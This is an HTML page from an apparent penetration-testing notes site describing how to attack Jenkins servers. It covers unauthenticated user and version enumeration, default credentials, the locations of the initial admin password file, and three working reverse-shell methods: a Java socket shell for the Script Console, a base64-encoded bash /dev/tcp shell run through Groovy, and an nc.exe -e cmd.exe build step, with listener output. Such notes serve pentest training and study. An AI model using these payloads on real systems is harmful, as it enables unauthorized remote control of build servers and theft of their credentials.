@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Jenkins | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="Jenkins" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/software/jenkins/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/software/jenkins/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"Introduction","url":"http://0.0.0.0:4000/hackingnotes/software/jenkins/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Jenkins","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Software</h2>
+				<h3>Jenkins</h3>
+			</div>
+			<article class="content">
+				<h1 id="introduction">Introduction</h1>
+
+<p>Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.</p>
+
+<p><img src="/hackingnotes/images/jenkins.png" alt="Jenkins Login." /></p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>We can obtain a some valuable information without necessarily log in on the server.</p>
+
+<h2 id="jenkins-version">Jenkins Version</h2>
+
+<p>Visit the following route to obtain the Jenkins version on the footer page.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/oops
+/error
+
+Page generated: Sep 27, 2021 12:46:28 PM PDTREST APIJenkins ver. 2.204.1
+</code></pre></div></div>
+
+<h2 id="users">Users</h2>
+
+<p>Without credentials it is possible to obtain some users.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/people
+/people/
+/asynchPeople
+/asynchPeople/
+/securityRealm/user/admin/search/index?q=
+</code></pre></div></div>
+
+<h1 id="credentials">Credentials</h1>
+
+<p>There are no default credentials but some times these works.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:admin
+admin:password
+admin:jenkins
+</code></pre></div></div>
+
+<p>In new versions the password is randomized at installation. We can find the initial password here:</p>
+
+<ul>
+  <li><strong>Linux</strong></li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/jenkins_home/secrets/initialAdminPassword
+/home/jenkins/secrets/initialAdminPassword
+/var/lib/jenkins/secrets/initialAdminPassword
+/opt/jenkins/secrets/initialAdminPassword
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Windows</strong></li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files (x86)\Jenkins\secrets\initialAdminPassword
+C:\Program Files\Jenkins\secrets\initialAdminPassword
+</code></pre></div></div>
+
+<h1 id="from-admin-to-reverse-shell">From Admin to Reverse Shell</h1>
+
+<p>There are multiple ways in which from administrative privileges in Jenkins you can get a reverse shell.</p>
+
+<h2 id="script-console">Script Console</h2>
+
+<p>To obtain a Reverse shell we need to execute <strong><code class="highlighter-rouge">Manage Jenkins</code></strong> on <strong><code class="highlighter-rouge">Script Console.</code></strong></p>
+
+<p><img src="/hackingnotes/images/jenkins_scriptconsole.png" alt="Jenking Script Console." /></p>
+
+<h3 id="windows-reverse-shell">Windows Reverse Shell</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String host="&lt;IP-ADDR&gt;";
+int port=&lt;PORT&gt;;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre></div></div>
+
+<h3 id="linux-reverse-shell">Linux Reverse Shell</h3>
+
+<p>First we need to craft the payload.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1'" | base64
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMScK
+</code></pre></div></div>
+
+<p>And introduce inside the Grovvy script.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out&gt; $sout err&gt; $serr"
+</code></pre></div></div>
+
+<h2 id="freestyle-project">Freestyle Project</h2>
+
+<p>Go on <strong><code class="highlighter-rouge">New Item</code></strong> tab.</p>
+
+<p><img src="/hackingnotes/images/jenkins_newitem.png" alt="Jenkins Dashboard" /></p>
+
+<p>Introduce a name such as <strong><code class="highlighter-rouge">Access</code></strong> and select <strong><code class="highlighter-rouge">Freestyle Project</code></strong> .</p>
+
+<p><img src="/hackingnotes/images/jenkins_projects.png" alt="Jenkins Creating a New Item." /></p>
+
+<p>Scroll down until you find the <strong><code class="highlighter-rouge">Build</code></strong> section and add a <strong><code class="highlighter-rouge">Execute Windows batch command</code></strong> as build step.</p>
+
+<p><img src="/hackingnotes/images/jenkins_build.png" alt="Jenkins Execute Windows Batch Command." /></p>
+
+<p>Introduce the reverse shell on the Command window and click <strong><code class="highlighter-rouge">Save</code></strong>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.10.10\share\nc.exe -e cmd.exe 10.10.10.10
+</code></pre></div></div>
+
+<p>Go to <strong><code class="highlighter-rouge">Build Now</code></strong> section.</p>
+
+<p><img src="/hackingnotes/images/jenkins_buildnow.png" alt="Jenkins Build Now section." /></p>
+
+<p>When the build is executed a new item will be displayed under the <strong><code class="highlighter-rouge">Build History</code></strong>.</p>
+
+<p><img src="/hackingnotes/images/jenkins_history" alt="Jenkins Build History." /></p>
+
+<p>At that moment a reverse shell is obtained.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -lvp 443
+listening on [any] 443 ...
+connect to [10.10.10.11] from (UNKNOWN) [10.10.10.11] 26524
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;    
+</code></pre></div></div>
+
+<p>We can also check the console output selecting the <strong><code class="highlighter-rouge">Built Item #1</code></strong> and going to <strong><code class="highlighter-rouge">Console Output</code></strong> section.</p>
+
+<p><img src="/hackingnotes/images/jenkins_console.png" alt="Jenkins Console Output." /></p>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
